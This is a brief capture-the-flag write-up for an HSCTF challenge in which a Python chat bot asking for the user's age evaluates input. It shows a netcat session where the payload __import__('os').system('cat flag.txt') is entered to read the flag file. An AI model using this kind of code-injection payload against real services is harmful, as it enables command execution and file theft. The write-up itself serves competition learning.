# HSCTF - Simple Cinversation

## Desc

A simple bot in python (prabably over socket) asking you about your age.

## Vuln

The bot alows you to exec some python code.
Execute "ls" via os.system to find the "flag.txt"
Then just "cat" it!

## Sploit


```python
nc misc.hsctf.com 9001
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> __import__('os').system('cat flag.txt')                      
hsctf{plz_u5e_pyth0n_3}
Wow!
Sometimes I wish I was 0
Well, it was nice meeting you, 0-year-old.
Goodbye!
```
